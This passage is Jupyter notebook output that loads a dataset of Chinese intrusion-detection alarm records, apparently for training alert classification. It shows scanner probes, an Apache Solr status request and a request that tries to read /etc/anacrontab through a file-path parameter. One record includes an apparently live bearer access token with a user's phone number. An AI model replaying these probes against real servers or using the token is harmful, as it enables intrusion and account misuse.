\"建议检查自身应用服务器是否有高危端口对外开放，并根据实际情况应用防火墙测略进行IP封堵\", \"hit_start\": 19, \"detail_info\": \"Masscan的扫描结果类似于Nmap(一个端口扫描器)，在内部，它更像scanrand, unicornscan, and ZMap，采用了异步传输的方式。它和这些扫描器最主要的区别是，它比这些扫描器更快。而且，masscan更加灵活，它允许自定义任意的地址范和端口范围。\", \"xff\": \"\", \"sip\": \"79.110.62.153\", \"vuln_desc\": \"Masscan的扫描结果类似于Nmap(一个端口扫描器)，在内部，它更像scanrand, unicornscan, and ZMap，采用了异步传输的方式。它和这些扫描器最主要的区别是，它比这些扫描器更快。而且，masscan更加灵活，它允许自定义任意的地址范和端口范围。\", \"public_date\": \"2023-03-17 16:10:28\", \"sport\": 61000}, \"solution\": \"建议检查自身应用服务器是否有高危端口对外开放，并根据实际情况应用防火墙测略进行IP封堵\", \"hit_start\": \"19\", \"skyeye_id\": \"\", \"payload\": {\"req_header\": \"R0VUIC8gSFRUUC8xLjANClVzZXItQWdlbnQ6IGl2cmUtbWFzc2Nhbi8xLjMgaHR0cHM6Ly9naXRodWIuY29tL3JvYmVydGRhdmlkZ3JhaGFtLw0KQWNjZXB0OiAqLyoNCg0K\", \"req_body\": \"\", \"rsp_header\": \"\", \"rsp_body\": \"\"}, \"detail_info\": \"Masscan的扫描结果类似于Nmap(一个端口扫描器)，在内部，它更像scanrand, unicornscan, and ZMap，采用了异步传输的方式。它和这些扫描器最主要的区别是，它比这些扫描器更快。而且，masscan更加灵活，它允许自定义任意的地址范和端口范围。\", \"file_md5\": \"\", \"host\": \"\", \"host_state\": \"失败\", \"rule_key\": \"webids\", \"api\": \"\", \"first_access_time\": \"2024-11-27 23:07:06\", \"hazard_level\": \"6\", \"hazard_rating\": \"高危\", \"hit_field\": \"req_header\", \"rsp_body\": \"\", \"h_method\": \"GET\", \"sip_addr\": \"美国--弗吉尼亚州--阿什本\", \"x_forwarded_for\": \"\", \"accept\": \"*/*\", \"device_ip\": \"172.31.191.58\", \"alarm_source\": \"天眼分析平台-57\", \"vuln_name\": \"发现黑客工具Masscan扫描行为\", \"alarm_sip\": \"172.31.193.243\", \"rule_desc\": \"网页漏洞利用\", \"skyeye_index\": \"\", \"sip_ioc_dip\": \"05e84db64fa1146b2d43bc83b3c8c5b7\", \"proto\": \"http\", \"xff\": \"\", \"alarm_id\": \"20241127_822406b6afaa6c98294a31aeb30f3195\", \"vuln_desc\": \"Masscan的扫描结果类似于Nmap(一个端口扫描器)，在内部，它更像scanrand, unicornscan, and ZMap，采用了异步传输的方式。它和这些扫描器最主要的区别是，它比这些扫描器更快。而且，masscan更加灵活，它允许自定义任意的地址范和端口范围。\", \"attack_chain\": \"0x01010000\", \"access_time\": \"2024-11-27 23:07:06\", \"attack_addr\": \"美国--弗吉尼亚州--阿什本(39.043640/-77.487270)\", \"type_chain\": \"140E0000\", \"vuln_harm\": \"攻击者可通过Masscan快速获悉目标端口的状态，并针对开启的端口进行攻击。\", \"dip_addr\": \"局域网\", \"dport\": \"80\", \"alert_devip\": \"172.31.191.57\", \"rsp_status\": \"0\", \"update_time\": \"1732720005\", \"code_language\": \"\", \"branch_id\": \"QbJK/5PW2\", \"att_ck\": \"\", \"sip\": \"79.110.62.153\", \"public_date\": \"2023-03-17 16:10:28\", \"dimension\": \"3\", \"skyeye_serial_num\": \"QbJK/8ze/\", \"url_path\": \"/\", \"src_mac\": \"00:94:a1:5e:6e:87\", \"file_name\": \"\", \"confidence\": \"中\", \"rsp_header\": \"\", \"super_type\": \"恶意软件\", \"site_app\": \"\", \"super_attack_chain\": \"0x01000000\", \"hit_end\": \"39\", \"h_proto_version\": \"HTTP/1.0\", \"serial_num\": \"QbJK/8ze/\", \"uri\": \"/\", \"dst_mac\": \"00:24:ac:dd:9d:fb\", \"is_delete\": \"0\", \"tcp_option\": \"\", \"rule_id\": \"0x10020582\", \"req_header\": \"GET / HTTP/1.0\\\\r\\\\nUser-Agent: ivre-masscan/1.3 https://github.com/robertdavidgraham/\\\\r\\\\nAccept: */*\\\\r\\\\n\\\\r\\\\n\", \"req_body\": \"\", \"attack_org\": \"\", \"is_white\": \"0\", \"alarm_sample\": \"1\", \"attack_sip\": \"79.110.62.153\", \"rule_state\": \"green\", \"asset_group\": \"未分配资产组\", \"ioc\": \"268567938-发现黑客工具Masscan扫描行为\", \"rule_labels\": \"{\\\\\"0x10080e\\\\\": {\\\\\"parent_id\\\\\": \\\\\"0x100800\\\\\", \\\\\"type\\\\\": \\\\\"扫描器名称\\\\\", \\\\\"name\\\\\": \\\\\"Masscan\\\\\", \\\\\"parent_name\\\\\": \\\\\"Web漏洞扫描\\\\\"}, \\\\\"0x110A02\\\\\": {\\\\\"parent_name\\\\\": \\\\\"资产识别\\\\\", \\\\\"type\\\\\": \\\\\"模块名称\\\\\", \\\\\"name\\\\\": \\\\\"UA指纹识别\\\\\", \\\\\"parent_id\\\\\": \\\\\"0x110A00\\\\\", \\\\\"role\\\\\": \\\\\"C\\\\\", \\\\\"device\\\\\": \\\\\"Spider/Spider\\\\\", \\\\\"hw_type\\\\\": \\\\\"PC\\\\\"}}\", \"host_md5\": \"d41d8cd98f00b204e9800998ecf8427e\", \"sport\": \"61000\", \"h_url\": \"/\", \"user-agent\": \"ivre-masscan/1.3 https://github.com/robertdavidgraham/\"}',\n",
       "  '{\"write_date\": \"1732715834\", \"vlan_id\": \"\", \"vuln_type\": \"Apache Solr 信息泄露漏洞\", \"rule_version_str\": \"3.0.1122.14572\", \"attack_type\": \"信息泄露\", \"dip_group\": \"未分配资产组\", \"is_web_attack\": \"1\", \"nid\": \"\", \"dip\": \"172.23.47.67\", \"sip_group\": \"\", \"repeat_count\": \"1\", \"type\": \"信息泄露\", \"skyeye_type\": \"webids-webattack_dolog\", \"_origin\": {\"write_date\": 1732715834, \"vuln_harm\": \"可能导致网站敏感信息泄露等\", \"rule_version_str\": \"3.0.1122.14572\", \"hit_field\": \"req_header\", \"dip\": \"172.23.47.67\", \"site_app\": \"\", \"hit_end\": 128, \"uri\": \"/solr/admin/cores?action=STATUS&wt=json\", \"dport\": 443, \"vuln_name\": \"Apache Solr 信息泄露漏洞\", \"rsp_status\": 0, \"code_language\": \"\", \"solution\": \"目前官方已经发布新版本修改了该漏洞，建议您升级到对应的最新的版本。\", \"hit_start\": 108, \"detail_info\": \"Apache Solr是美国阿帕奇（Apache）软件基金会的一款基于Lucene（一款全文搜索引擎）的搜索服务器。该产品支持层面搜索、垂直搜索、高亮显示搜索结果等\\\\r\\\\n\\\\r\\\\n该系统存在任意文件读取漏洞,参数stream.url未过滤导致可以读取任意文件。\", \"xff\": \"\", \"sip\": \"164.90.211.97\", \"vuln_desc\": \"Apache Solr是美国阿帕奇（Apache）软件基金会的一款基于Lucene（一款全文搜索引擎）的搜索服务器。该产品支持层面搜索、垂直搜索、高亮显示搜索结果等\\\\r\\\\n\\\\r\\\\n该系统存在任意文件读取漏洞,参数stream.url未过滤导致可以读取任意文件。\", \"public_date\": \"2023-03-31 14:52:15\", \"sport\": 12734}, \"solution\": \"目前官方已经发布新版本修改了该漏洞，建议您升级到对应的最新的版本。\", \"hit_start\": \"108\", \"skyeye_id\": \"\", \"payload\": {\"req_header\": \"R0VUIC9zb2xyL2FkbWluL2NvcmVzP2FjdGlvbj1TVEFUVVMmd3Q9anNvbiBIVFRQLzEuMQ0KSG9zdDogMjE4Ljc2LjE1LjI2OjQ0Mw0KVXNlci1BZ2VudDogR28taHR0cC1jbGllbnQvMS4xDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=\", \"req_body\": \"\", \"rsp_header\": \"\", \"rsp_body\": \"\"}, \"detail_info\": \"Apache Solr是美国阿帕奇（Apache）软件基金会的一款基于Lucene（一款全文搜索引擎）的搜索服务器。该产品支持层面搜索、垂直搜索、高亮显示搜索结果等\\\\r\\\\n\\\\r\\\\n该系统存在任意文件读取漏洞,参数stream.url未过滤导致可以读取任意文件。\", \"file_md5\": \"\", \"host\": \"218.76.15.26:443\", \"host_state\": \"失败\", \"action\": \"STATUS\", \"rule_key\": \"webids\", \"connection\": \"close\", \"api\": \"218.76.15.26:443/solr/admin/cores\", \"first_access_time\": \"2024-11-27 21:57:14\", \"hazard_level\": \"4\", \"hazard_rating\": \"中危\", \"hit_field\": \"req_header\", \"rsp_body\": \"\", \"h_method\": \"GET\", \"sip_addr\": \"德国--黑森州--美因河畔法兰克福\", \"x_forwarded_for\": \"\", \"device_ip\": \"172.31.191.58\", \"alarm_source\": \"天眼分析平台-57\", \"vuln_name\": \"Apache Solr 信息泄露漏洞\", \"alarm_sip\": \"172.23.47.67\", \"rule_desc\": \"网页漏洞利用\", \"skyeye_index\": \"\", \"sip_ioc_dip\": \"726526efb47295568b21edac8cdc558d\", \"proto\": \"http\", \"xff\": \"\", \"alarm_id\": \"20241127_5485b96f7230190ee187faebc16194f7\", \"vuln_desc\": \"Apache Solr是美国阿帕奇（Apache）软件基金会的一款基于Lucene（一款全文搜索引擎）的搜索服务器。该产品支持层面搜索、垂直搜索、高亮显示搜索结果等\\\\r\\\\n\\\\r\\\\n该系统存在任意文件读取漏洞,参数stream.url未过滤导致可以读取任意文件。\", \"attack_chain\": \"0x01020000\", \"access_time\": \"2024-11-27 21:57:14\", \"attack_addr\": \"德国--黑森州--美因河畔法兰克福(50.110809/8.687473)\", \"type_chain\": \"16160000\", \"vuln_harm\": \"可能导致网站敏感信息泄露等\", \"dip_addr\": \"局域网\", \"dport\": \"443\", \"alert_devip\": \"172.31.191.57\", \"rsp_status\": \"0\", \"update_time\": \"1732715812\", \"code_language\": \"\", \"branch_id\": \"QbJK/5PW2\", \"att_ck\": \"初始访问:TA0001|利用面向公众的应用程序:T1190\", \"sip\": \"164.90.211.97\", \"public_date\": \"2023-03-31 14:52:15\", \"dimension\": \"3\", \"wt\": \"json\", \"skyeye_serial_num\": \"QbJK/8ze/\", \"url_path\": \"/solr/admin/cores\", \"src_mac\": \"00:94:a1:5e:6e:87\", \"file_name\": \"\", \"confidence\": \"高\", \"rsp_header\": \"\", \"super_type\": \"攻击利用\", \"site_app\": \"\", \"super_attack_chain\": \"0x01000000\", \"hit_end\": \"128\", \"h_proto_version\": \"HTTP/1.1\", \"serial_num\": \"QbJK/8ze/\", \"uri\": \"/solr/admin/cores?action=STATUS&wt=json\", \"dst_mac\": \"00:24:ac:dd:9d:fb\", \"is_delete\": \"0\", \"tcp_option\": \"\", \"rule_id\": \"0x1002155e\", \"req_header\": \"GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1\\\\r\\\\nHost: 218.76.15.26:443\\\\r\\\\nUser-Agent: Go-http-client/1.1\\\\r\\\\nConnection: close\\\\r\\\\n\\\\r\\\\n\", \"req_body\": \"\", \"attack_org\": \"\", \"is_white\": \"0\", \"alarm_sample\": \"1\", \"attack_sip\": \"164.90.211.97\", \"rule_state\": \"green\", \"asset_group\": \"未分配资产组\", \"ioc\": \"268571998-Apache Solr 信息泄露漏洞\", \"rule_labels\": \"{\\\\\"0x10070d\\\\\": {\\\\\"parent_id\\\\\": \\\\\"0x100700\\\\\", \\\\\"type\\\\\": \\\\\"服务类型\\\\\", \\\\\"name\\\\\": \\\\\"其他\\\\\", \\\\\"parent_name\\\\\": \\\\\"未授权访问\\\\\"}, \\\\\"0x110A02\\\\\": {\\\\\"parent_name\\\\\": \\\\\"资产识别\\\\\", \\\\\"type\\\\\": \\\\\"模块名称\\\\\", \\\\\"name\\\\\": \\\\\"UA指纹识别\\\\\", \\\\\"parent_id\\\\\": \\\\\"0x110A00\\\\\", \\\\\"role\\\\\": \\\\\"C\\\\\", \\\\\"software\\\\\": \\\\\"Go-http-client/1.1\\\\\", \\\\\"hw_type\\\\\": \\\\\"PC\\\\\"}}\", \"host_md5\": \"b463958809b4db303f18ed43c2097043\", \"sport\": \"12734\", \"h_url\": \"/solr/admin/cores?action=STATUS&wt=json\", \"user-agent\": \"Go-http-client/1.1\"}',\n",
       "  '{\"write_date\": \"1732715788\", \"vlan_id\": \"\", \"vuln_type\": \"发现NMAP探测行为（SSL）\", \"attack_type\": \"信息泄露\", \"dip_group\": \"未分配资产组\", \"is_web_attack\": \"0\", \"nid\": \"\", \"dip\": \"172.23.47.67\", \"sip_group\": \"\", \"repeat_count\": \"1\", \"type\": \"信息泄露\", \"skyeye_type\": \"webids-ids_dolog\", \"_origin\": {\"write_date\": 1732715788, \"rule_name\": \"发现NMAP探测行为（SSL）\", \"hit_field\": \"\", \"description\": \"1\", \"dip\": \"172.23.47.67\", \"protocol_id\": 6, \"hit_end\": 163, \"uri\": \"\", \"cnnvd_id\": \"\", \"dport\": 443, \"rule_version\": \"3.0.1122.14572\", \"hit_start\": 143, \"detail_info\": \"发现主机或服务器信息探测行为。类似Nmap这样的扫描器正在探测主机或服务器的存活状态、操作系统版本等信息。攻击者通过收集此类信息，以实施进一步攻击。\", \"packet_size\": 164, \"appid\": 19, \"proto\": \"ssl\", \"xff\": \"\", \"sip\": \"46.101.223.77\", \"attack_method\": \"远程\", \"affected_system\": \"\", \"sig_id\": 2539, \"sport\": 32321, \"bulletin\": \"排查来源IP是否是攻击者，如果是，建议封禁该IP。\"}, \"hit_start\": \"143\", \"skyeye_id\": \"\", \"payload\": {\"packet_data\": \"ACSs3Z37AJShXm6HCABFAACWJn9AAC0GPdYuZd9NrBcvQ35BAbtTI0pB4jgQDFAYAfYc9AAAFgMAAGkBAABlAwNVHKfkcmFuZG9tMXJhbmRvbTJyYW5kb20zcmFuZG9tNAAADAAvAAoAEwA5AAQA/wEAADAADQAsACoAAQADAAIGAQYDBgICAQIDAgIDAQMDAwIEAQQDBAIBAQEDAQIFAQUDBQI=\"}, \"detail_info\": \"发现主机或服务器信息探测行为。类似Nmap这样的扫描器正在探测主机或服务器的存活状态、操作系统版本等信息。攻击者通过收集此类信息，以实施进一步攻击。\", \"file_md5\": \"\", \"host\": \"\", \"host_state\": \"企图\", \"rule_key\": \"webids\", \"api\": \"\", \"first_access_time\": \"2024-11-27 21:56:28\", \"hazard_level\": \"4\", \"hazard_rating\": \"中危\", \"rule_name\": \"发现NMAP探测行为（SSL）\", \"packet_data\": \"ACSs3Z37AJShXm6HCABFAACWJn9AAC0GPdYuZd9NrBcvQ35BAbtTI0pB4jgQDFAYAfYc9AAAFgMAAGkBAABlAwNVHKfkcmFuZG9tMXJhbmRvbTJyYW5kb20zcmFuZG9tNAAADAAvAAoAEwA5AAQA/wEAADAADQAsACoAAQADAAIGAQYDBgICAQIDAgIDAQMDAwIEAQQDBAIBAQEDAQIFAQUDBQI=\", \"hit_field\": \"\", \"sip_addr\": \"德国--黑森州--美因河畔法兰克福\", \"protocol_id\": \"6\", \"cnnvd_id\": \"\", \"x_forwarded_for\": \"\", \"device_ip\": \"172.31.191.58\", \"alarm_source\": \"天眼分析平台-57\", \"alarm_sip\": \"172.23.47.67\", \"rule_desc\": \"网络攻击\", \"rule_version\": \"3.0.1122.14572\", \"skyeye_index\": \"\", \"sip_ioc_dip\": \"9c3d5ad869f3584cd0bdf920c1b51289\", \"proto\": \"ssl\", \"xff\": \"\", \"alarm_id\": \"20241127_d3d34fa72e39c248deda481c5d85d385\", \"attack_chain\": \"0x01050000\", \"access_time\": \"2024-11-27 21:56:28\", \"attack_addr\": \"德国--黑森州--美因河畔法兰克福(50.110809/8.687473)\", \"type_chain\": \"16160000\", \"description\": \"1\", \"dip_addr\": \"局域网\", \"dport\": \"443\", \"alert_devip\": \"172.31.191.57\", \"rsp_status\": \"\", \"update_time\": \"1732715778\", \"branch_id\": \"QbJK/5PW2\", \"att_ck\": \"\", \"sip\": \"46.101.223.77\", \"attack_method\": \"远程\", \"affected_system\": \"\", \"dimension\": \"3\", \"skyeye_serial_num\": \"QbJK/8ze/\", \"src_mac\": \"00:94:a1:5e:6e:87\", \"confidence\": \"中\", \"super_type\": \"攻击利用\", \"super_attack_chain\": \"0x01000000\", \"hit_end\": \"163\", \"serial_num\": \"QbJK/8ze/\", \"uri\": \"\", \"dst_mac\": \"00:24:ac:dd:9d:fb\", \"is_delete\": \"0\", \"tcp_option\": \"\", \"rule_id\": \"0x59b6\", \"attack_org\": \"\", \"is_white\": \"0\", \"packet_size\": \"164\", \"alarm_sample\": \"1\", \"appid\": \"19\", \"attack_sip\": \"46.101.223.77\", \"rule_state\": \"green\", \"asset_group\": \"未分配资产组\", \"ioc\": \"22966-发现NMAP探测行为（SSL）\", \"rule_labels\": \"{}\", \"sig_id\": \"2539\", \"host_md5\": \"\", \"sport\": \"32321\", \"bulletin\": \"排查来源IP是否是攻击者，如果是，建议封禁该IP。\"}'],\n",
       " 'output': ['攻击', '攻击', '攻击', '攻击', '攻击']}"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from datasets import load_dataset\n",
    "# 加载数据集\n",
    "ds = load_dataset(\"tiangler/cybersecurity_alarm_analysis\")\n",
    "\n",
    "# 看看有哪些 split\n",
    "print(ds)\n",
    "\n",
    "# 看前几条样本\n",
    "ds[\"train\"][:5]\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "4b31a62e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{\"write_date\": \"1732722399\", \"rule_version_str\": \"3.0.1122.14572\", \"dip_group\": \"省公司\", \"nid\": \"\", \"sip_group\": \"\", \"type\": \"信息泄露\", \"_origin\": {\"write_date\": 1732722399, \"vuln_harm\": \"服务器敏感信息一旦泄露会导致攻击者获得重要信息，增加攻击成功率。\", \"rule_version_str\": \"3.0.1122.14572\", \"hit_field\": \"\", \"dip\": \"172.31.192.209\", \"site_app\": \"\", \"hit_end\": 0, \"uri\": \"/gateway/support/oss/getPublicInputStream?filePath=/etc/anacrontab\", \"dport\": 473, \"vuln_name\": \"敏感信息扫描(机器学习)\", \"rsp_status\": 200, \"code_language\": \"\", \"solution\": \"请确认服务器是否存在相关文件，如果存在，可考虑迁移或删除敏感信息文件。\", \"hit_start\": 0, \"detail_info\": \"发现正在探测敏感信息文件，敏感的文件包括数据库文件、整站压缩文件、服务器或框架重要的配置文件、日志文件、压缩文件等。\", \"xff\": \"\", \"sip\": \"183.209.50.59\", \"vuln_desc\": \"发现正在探测敏感信息文件，敏感的文件包括数据库文件、整站压缩文件、服务器或框架重要的配置文件、日志文件、压缩文件等。\", \"public_date\": \"2020-11-25 19:44:12\", \"sport\": 36228}, \"detail_info\": \"发现正在探测敏感信息文件，敏感的文件包括数据库文件、整站压缩文件、服务器或框架重要的配置文件、日志文件、压缩文件等。\", \"file_md5\": \"\", \"rule_key\": \"webids\", \"connection\": \"keep-alive\", \"api\": \"zhny.hn.sgcc.com.cn/gateway/support/oss/getPublicInputStream\", \"first_access_time\": \"2024-11-27 23:46:39\", \"hazard_level\": \"2\", \"cookie\": \"sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%22191d59a55edcf2-05bd8f349acb414-26001e51-2073600-191d59a55eef89%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%2C%22%24latest_referrer_host%22%3A%22%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTkxZDU5YTU1ZWRjZjItMDViZDhmMzQ5YWNiNDE0LTI2MDAxZTUxLTIwNzM2MDAtMTkxZDU5YTU1ZWVmODkifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%221935eec21f6967-011a48e8b28415-26001151-2073600-1935eec21f814be%22%7D; access_token=Bearer%20eyJhbGciOiJIUzUxMiJ9.eyJzeXNUeXBlIjoiWkhOWV9XRUIiLCJhdXRob3JpdGllc1NldCI6WyIwMjE4Il0sImZpcnN0TG9naW4iOmZhbHNlLCJsb2dpblR5cGUiOiJVU0VSTkFNRV9QV0QiLCJyb2xlcyI6IiIsInNvdXJjZSI6IjAxIiwicm9sZXNTZXQiOltdLCJlbmFibGVkIjoxLCJ0b2tlbktleSI6ImFzYWZhZmYuMjAyNDExMjcwMDUwMDQ3MDMiLCJleHBpcmVkIjowLCJsb2dpblRpbWUiOjE3MzI2Mzk4MDQ3MDMsInVzZXJTdGF0ZSI6MSwiaWQiOjIwMDMwMjk5LCJsb2NrZWQiOjAsImlhdCI6MTczMjYzOTgwNCwiZ3JvdXBDb2RlIjoiMDIxOCIsImlzU2VydmljZVN0YXRpb24iOjAsImlzQ2hpbGRVc2VyIjpmYWxzZSwiYXV0aG9yaXRpZXNHQSI6W3siYXV0aG9yaXR5IjoiMDIxOCJ9XSwicHJvdG9jb2xTaWduIjoiMSIsImF1dGhvcml0aWVzIjoiMDIxOCIsImhvbWVSb3V0ZXIiOiIvc3lzU2V0dGluZy9wZXJzb25hbENlbnRlciIsInBob25lIjoiMTgwNjE4NDM5MjciLCJ1c2VyVHlwZSI6MCwicHdkRXhwaXJhdGlvblRpbWUiOjE3MzczMDA1NTIwMDAsInVzZXJuYW1lIjoiYXNhZmFmZiJ9.OqXAUbMFHWOcZ56OrQVcgKnQOVjLMSv4hof5lH_JKvrmqCN8QJK0407KxtQJttJ4ZTKH7NBTk6vFNiNwVFRDLQ; uuid=20030299\", \"hazard_rating\": \"低危\", \"hit_field\": \"\", \"h_method\": \"GET\", \"sip_addr\": \"中国--江苏省--南京市\", \"x_forwarded_for\": \"\", \"accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\", \"device_ip\": \"172.31.191.7\", \"alarm_source\": \"天眼分析平台-8\", \"vuln_name\": \"敏感信息扫描(机器学习)\", \"alarm_sip\": \"172.31.192.209\", \"skyeye_index\": \"\", \"sip_ioc_dip\": \"17723502529a7dc0b6f137d092be2e56\", \"xff\": \"\", \"vuln_desc\": \"发现正在探测敏感信息文件，敏感的文件包括数据库文件、整站压缩文件、服务器或框架重要的配置文件、日志文件、压缩文件等。\", \"attack_chain\": \"0x01010000\", \"vuln_harm\": \"服务器敏感信息一旦泄露会导致攻击者获得重要信息，增加攻击成功率。\", \"sec-fetch-user\": \"?1\", \"dport\": \"473\", \"alert_devip\": \"172.31.191.8\", \"update_time\": \"1732722338\", \"code_language\": \"\", \"sec-ch-ua-mobile\": \"?0\", \"public_date\": \"2020-11-25 19:44:12\", \"skyeye_serial_num\": \"QbJK/jYtc\", \"sec-fetch-mode\": \"navigate\", \"site_app\": \"\", \"super_attack_chain\": \"0x01000000\", \"hit_end\": \"0\", \"h_proto_version\": \"HTTP/1.1\", \"uri\": \"/gateway/support/oss/getPublicInputStream?filePath=/etc/anacrontab\", \"dst_mac\": \"00:24:ac:dd:9d:fb\", \"is_delete\": \"0\", \"rule_id\": \"0x10020b6a\", \"sec-ch-ua\": \"\\\"Chromium\\\";v=\\\"128\\\", \\\"Not;A=Brand\\\";v=\\\"24\\\", \\\"Google Chrome\\\";v=\\\"128\\\"\", \"attack_org\": \"\", \"is_white\": \"0\", \"alarm_sample\": \"1\", \"attack_sip\": \"183.209.50.59\", \"host_md5\": \"8264552e08a54b43da4a95c89edc9c8b\", \"user-agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36\", \"sec-fetch-dest\": \"document\", \"vlan_id\": \"\", \"vuln_type\": \"敏感信息扫描(机器学习)\", \"attack_type\": \"敏感信息/重要文件泄漏\", \"is_web_attack\": \"1\", \"dip\": \"172.31.192.209\", \"repeat_count\": \"1\", \"skyeye_type\": \"webids-webattack_dolog\", \"solution\": \"请确认服务器是否存在相关文件，如果存在，可考虑迁移或删除敏感信息文件。\", \"hit_start\": \"0\", \"filepath\": \"/etc/anacrontab\", \"skyeye_id\": \"\", \"payload\": {\"req_header\": \"R0VUIC9nYXRld2F5L3N1cHBvcnQvb3NzL2dldFB1YmxpY0lucHV0U3RyZWFtP2ZpbGVQYXRoPS9ldGMvYW5hY3JvbnRhYiBIVFRQLzEuMQ0KSG9zdDogemhueS5obi5zZ2NjLmNvbS5jbg0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0Kc2VjLWNoLXVhOiAiQ2hyb21pdW0iO3Y9IjEyOCIsICJOb3Q7QT1CcmFuZCI7dj0iMjQiLCAiR29vZ2xlIENocm9tZSI7dj0iMTI4Ig0Kc2VjLWNoLXVhLW1vYmlsZTogPzANCnNlYy1jaC11YS1wbGF0Zm9ybTogIldpbmRvd3MiDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTI4LjAuMC4wIFNhZmFyaS81MzcuMzYNCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC43DQpTZWMtRmV0Y2gtU2l0ZTogbm9uZQ0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtVXNlcjogPzENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KQWNjZXB0LUxhbmd1YWdlOiB6aC1DTix6aDtxPTAuOSxlbjtxPTAuOA0KQ29va2llOiBzZW5zb3JzZGF0YTIwMTVqc3Nka2Nyb3NzPSU3QiUyMmRpc3RpbmN0X2lkJTIyJTNBJTIyMTkxZDU5YTU1ZWRjZjItMDViZDhmMzQ5YWNiNDE0LTI2MDAxZTUxLTIwNzM2MDAtMTkxZDU5YTU1ZWVmODklMjIlMkMlMjJmaXJzdF9pZCUyMiUzQSUyMiUyMiUyQyUyMnByb3BzJTIyJTNBJTdCJTIyJTI0bGF0ZXN0X3RyYWZmaWNfc291cmNlX3R5cGUlMjIlM0ElMjIlRTclOUIlQjQlRTYlOEUlQTUlRTYlQjUlODElRTklODclOEYlMjIlMkMlMjIlMjRsYXRlc3Rfc2VhcmNoX2tleXdvcmQlMjIlM0ElMjIlRTYlOUMlQUElRTUlOEYlOTYlRTUlODglQjAlRTUlODAlQkNfJUU3JTlCJUI0JUU2JThFJUE1JUU2JTg5JTkzJUU1JUJDJTgwJTIyJTJDJTIyJTI0bGF0ZXN0X3JlZmVycmVyJTIyJTNBJTIyJTIyJTJDJTIyJTI0bGF0ZXN0X3JlZmVycmVyX2hvc3QlMjIlM0ElMjIlMjIlN0QlMkMlMjJpZGVudGl0aWVzJTIyJTNBJTIyZXlJa2FXUmxiblJwZEhsZlkyOXZhMmxsWDJsa0lqb2lNVGt4WkRVNVlUVTFaV1JqWmpJdE1EVmlaRGhtTXpRNVlXTmlOREUwTFRJMk1EQXhaVFV4TFRJd056TTJNREF0TVRreFpEVTVZVFUxWldWbU9Ea2lmUSUzRCUzRCUyMiUyQyUyMmhpc3RvcnlfbG9naW5faWQlMjIlM0ElN0IlMjJuYW1lJTIyJTNBJTIyJTIyJTJDJTIydmFsdWUlMjIlM0ElMjIlMjIlN0QlMkMlMjIlMjRkZXZpY2VfaWQlMjIlM0ElMjIxOTM1ZWVjMjFmNjk2Ny0wMTFhNDhlOGIyODQxNS0yNjAwMTE1MS0yMDczNjAwLTE5MzVlZWMyMWY4MTRiZSUyMiU3RDsgYWNjZXNzX3Rva2VuPUJlYXJlciUyMGV5SmhiR2NpT2lKSVV6VXhNaUo5LmV5SnplWE5VZVhCbElqb2lXa2hPV1Y5WFJVSWlMQ0poZFhSb2IzSnBkR2xsYzFObGRDSTZXeUl3TWpFNElsMHNJbVpwY25OMFRHOW5hVzRpT21aaGJITmxMQ0pzYjJkcGJsUjVjR1VpT2lKVlUwVlNUa0ZOUlY5UVYwUWlMQ0p5YjJ4bGN5STZJaUlzSW5OdmRYSmpaU0k2SWpBeElpd2ljbTlzWlhOVFpYUWlPbHRkTENKbGJtRmliR1ZrSWpveExDSjBiMnRsYmt0bGVTSTZJbUZ6WVdaaFptWXVNakF5TkRFeE1qY3dNRFV3TURRM01ETWlMQ0psZUhCcGNtVmtJam93TENKc2IyZHBibFJwYldVaU9qRTNNekkyTXprNE1EUTNNRE1zSW5WelpYSlRkR0YwWlNJNk1Td2lhV1FpT2pJd01ETXdNams1TENKc2IyTnJaV1FpT2pBc0ltbGhkQ0k2TVRjek1qWXpPVGd3TkN3aVozSnZkWEJEYjJSbElqb2lNREl4T0NJc0ltbHpVMlZ5ZG1salpWTjBZWFJwYjI0aU9qQXNJbWx6UTJocGJHUlZjMlZ5SWpwbVlXeHpaU3dpWVhWMGFHOXlhWFJwWlhOSFFTSTZXM3NpWVhWMGFHOXlhWFI1SWpvaU1ESXhPQ0o5WFN3aWNISnZkRzlqYjJ4VGFXZHVJam9pTVNJc0ltRjFkR2h2Y21sMGFXVnpJam9pTURJeE9DSXNJbWh2YldWU2IzVjBaWElpT2lJdmMzbHpVMlYwZEdsdVp5OXdaWEp6YjI1aGJFTmxiblJsY2lJc0luQm9iMjVsSWpvaU1UZ3dOakU0TkRNNU1